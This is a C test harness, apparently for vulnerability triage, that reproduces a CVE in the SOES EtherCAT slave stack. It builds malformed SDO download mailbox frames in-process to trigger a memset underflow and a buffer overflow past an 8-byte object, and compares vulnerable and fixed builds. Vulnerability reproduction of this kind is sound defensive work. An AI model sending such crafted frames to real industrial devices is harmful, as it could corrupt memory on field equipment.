/* SOES 3.2.0 vs 3.2.1 — CVE-2026-129796 source-bound triage.
 *
 * Drives two master-controlled writes in the REAL SDO_download() through the
 * REAL ESC_coeprocess() mailbox dispatcher:
 *
 *   (a) "memset" — DTYPE_VISIBLE_STRING with actsize < declared size:
 *       memset(data + size, 0, actsize - size) underflows;
 *   (b) "copy"   — DTYPE_OCTET_STRING with actsize < mailbox payload:
 *       copy2mbx(mbxdata, data, size) writes past the object buffer.
 *
 * The object dictionary here is a modeled precondition: writable flexible
 * objects with RAM data. The stock lan9252demo VISIBLE_STRING entries are
 * ATYPE_RO; this harness does not claim they are writable in that build.
 *
 * MBX[] is filled in-process: no wire, no HAL, no live slave, no command
 * side effect. This is rung-3 source-bound triage, NOT wire evidence/R5.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
static uint8_t g_oct_alone[8];   /* standalone global: ASan sees its bounds */

/* Real MBX/MBXcontrol/ESCvar and the real object handlers from ecat_slv.c. */
#include "ecat_slv.c"

/* Struct layout pins the canary immediately after the 8-byte object buffer
 * so a plain build can show chosen bytes past the declared object size. */
static struct {
   uint8_t data[8];
   uint8_t canary[128];
} g_str, g_oct;
static uint8_t g_ms0, g_ms1;

static const char n_ms[] = "maxsub", n_str[] = "visible-string",
                  n_oct[] = "octet-string", n_obj[] = "flexible-object";

static const _objd od_2000[] = {
   { 0, DTYPE_UNSIGNED8,      8, ATYPE_RO,    n_ms,   0, &g_ms0     },
   { 1, DTYPE_VISIBLE_STRING, 64, ATYPE_RWpre, n_str,  0, g_str.data },
};
static const _objd od_2001[] = {
   { 0, DTYPE_UNSIGNED8,      8, ATYPE_RO,    n_ms,   0, &g_ms1     },
   { 1, DTYPE_OCTET_STRING,   64, ATYPE_RWpre, n_oct,  0, g_oct.data },
};
static const _objd od_2002[] = {
   { 0, DTYPE_UNSIGNED8,      8, ATYPE_RO,    n_ms,   0, &g_ms0        },
   { 1, DTYPE_OCTET_STRING,   64, ATYPE_RWpre, n_oct,  0, g_oct_alone  },
};
const _objectlist SDOobjects[] = {
   { 0x2000, OTYPE_RECORD, 1, 0, n_obj, od_2000 },
   { 0x2001, OTYPE_RECORD, 1, 0, n_obj, od_2001 },
   { 0x2002, OTYPE_RECORD, 1, 0, n_obj, od_2002 },
   { 0xFFFF, 0, 0, 0, NULL, NULL },
};

/* Stubs for ecat_slv.c externs unused on this path. */
void ESC_write(uint16_t a, void *b, uint16_t l) { (void)a;(void)b;(void)l; }
void FOE_init(void) {}
void EOE_init(void) {}
void MBX_error(uint16_t err) { (void)err; }
uint8_t ESC_claimbuffer(void) { return 0; } /* suppress responses */
void ESC_read(uint16_t address, void *buf, uint16_t len)
{ (void)address; if (len) memset(buf, 0, len); }

/* Non-expedited SDO Download: declared size is master-controlled and is
 * independent of the bytes actually present in the mailbox payload. */
static void build_download(uint16_t index, uint8_t subindex,
                           uint32_t declared, const uint8_t *payload,
                           uint32_t nbytes)
{
   memset(MBX, 0, sizeof(MBX));
   _COEsdo *s = (_COEsdo *)&MBX[0];
   s->mbxheader.length = htoes(COE_HEADERSIZE + 4 + nbytes);
   s->mbxheader.mbxtype = MBXCOE;
   s->coeheader.numberservice = htoes(COE_SDOREQUEST << 12);
   s->command = COE_COMMAND_DOWNLOADREQUEST;
   s->index = htoes(index);
   s->subindex = subindex;
   s->size = htoel(declared);
   if (nbytes) memcpy((uint8_t *)(&s->size) + 4, payload, nbytes);
}

static void deliver(const char *label)
{
   printf("%s: len=%u xoe(before)=%02x\n", label,
          (unsigned)etohs(((_COEsdo *)&MBX[0])->mbxheader.length), ESCvar.xoe);
   MBXcontrol[0].state = MBXstate_inclaim;
   ESCvar.xoe = 0;
   ESC_coeprocess();
   printf("  -> xoe=%02x str0=%02x oct0=%02x canary_str=%u canary_oct=%u\n",
          ESCvar.xoe, g_str.data[0], g_oct.data[0],
          (unsigned)g_str.canary[0], (unsigned)g_oct.canary[0]);
}

static unsigned canary_count(const uint8_t *p)
{
   unsigned n = 0;
   for (unsigned i = 0; i < sizeof(g_oct.canary); i++) n += (p[i] != 0);
   return n;
}

int main(int argc, char **argv)
{
   const char *mode = argc > 1 ? argv[1] : "copy";
   uint8_t payload[64];
   memset(payload, 0x5a, sizeof(payload));
   memset(&g_str, 0, sizeof(g_str));
   memset(&g_oct, 0, sizeof(g_oct));
   g_ms0 = g_ms1 = 0;
   ESCvar.MBXrun = 1;
#ifdef SOES_FIXED_VERSION
   printf("build: 3.2.1 (hash-pinned fixed source)\n");
#else
   printf("build: 3.2.0 (hash-pinned vulnerable source)\n");
#endif
   printf("mode: %s\n", mode);
   ESCvar.ALstatus = ESCpreop;
   memset(MBXcontrol, 0, sizeof(MBXcontrol));
   ESCvar.xoe = 0;

   if (strcmp(mode, "memset") == 0) {
      /* actsize=8, declared 0x1000: memset(g_str.data+4096, 0, 8-4096). */
      build_download(0x2000, 1, 0x1000, NULL, 0);
      deliver("visible-string declared 4096 bytes for an 8-byte object");
   } else if (strcmp(mode, "copy") == 0) {
      /* actsize=8, declared 64, 64 payload bytes: no clamp, copy2mbx 64. */
      build_download(0x2001, 1, 64, payload, 64);
      deliver("octet-string declared/payload 64 for an 8-byte object");
   } else if (strcmp(mode, "copy-global") == 0) {
      /* Same write with a standalone 8-byte global target: ASan reports the
       * real bound, unlike the struct-embedded canary target above. */
      build_download(0x2002, 1, 64, payload, 64);
      deliver("octet-string 64 bytes into standalone 8-byte global");
   } else if (strcmp(mode, "copy-safe") == 0) {
      build_download(0x2001, 1, 8, payload, 8);
      deliver("control: octet-string declared/payload 8");
   } else if (strcmp(mode, "memset-safe") == 0) {
      build_download(0x2000, 1, 8, payload, 8);
      deliver("control: visible-string declared/payload 8");
   } else {
      printf("unknown mode\n");
      return 2;
   }
   printf("canary_oct[0..15]:");
   for (unsigned i = 0; i < 16; i++) printf(" %02x", g_oct.canary[i]);
   printf("\n");
   printf("verdict: str_canary_bytes=%u oct_canary_bytes=%u "
          "str_tail=%02x oct_tail=%02x\n",
          canary_count(g_str.canary), canary_count(g_oct.canary),
          g_str.data[7], g_oct.data[7]);
   return 0;
}
